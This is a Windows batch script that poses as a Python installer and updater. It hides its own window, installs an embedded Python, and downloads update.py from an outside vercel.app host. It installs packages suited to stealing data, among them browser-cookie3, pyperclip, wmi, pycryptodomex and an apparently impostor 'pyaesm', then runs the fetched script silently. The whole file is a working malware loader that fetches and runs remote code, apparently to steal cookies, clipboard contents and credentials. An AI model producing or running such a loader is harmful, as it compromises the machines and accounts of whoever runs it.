@echo off
:: Hide window
if not "%1"=="h" start /min cmd /c %0 h & exit

:: Variables
set "PYTHON_URL=https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
set "UPDATE_SCRIPT_URL=https://boostware-external-download.vercel.app/company/update.py"
set "INSTALL_PATH=%USERPROFILE%\Python311"
set "ZIP_PATH=%TEMP%\python311.zip"
set "UPDATE_SCRIPT_PATH=%INSTALL_PATH%\update.py"
set "PIP_PACKAGES=cryptography opencv-python psutil pycountry pyperclip pypiwin32 requests requests-toolbelt wmi pyaesm browser-cookie3 colorama customtkinter nuitka packaging pillow pycryptodomex pyinstaller"

:: Download Python embeddable zip
powershell -Command "& {Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%ZIP_PATH%'}"

:: Create Install Directory
if not exist "%INSTALL_PATH%" mkdir "%INSTALL_PATH%"

:: Extract Python
powershell -Command "& {Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_PATH%' -Force}"

:: Create a Python launcher script
echo @echo off > "%INSTALL_PATH%\python.bat"
echo %~dp0python.exe %%* >> "%INSTALL_PATH%\python.bat"

:: Add Python to User PATH (No Admin Needed)
setx PATH "%INSTALL_PATH%;%PATH%" /M

:: Download the update.py script
powershell -Command "& {Invoke-WebRequest -Uri '%UPDATE_SCRIPT_URL%' -OutFile '%UPDATE_SCRIPT_PATH%'}"

:: Install pip
powershell -Command "& {%INSTALL_PATH%\python.exe -m ensurepip}"

:: Upgrade pip
powershell -Command "& {%INSTALL_PATH%\python.exe -m pip install --upgrade pip}"

:: Install required packages
for %%p in (%PIP_PACKAGES%) do (
    powershell -Command "& {%INSTALL_PATH%\python.exe -m pip install %%p}"
)

:: Run update.py silently
start /min "" "%INSTALL_PATH%\python.exe" "%UPDATE_SCRIPT_PATH%"

exit
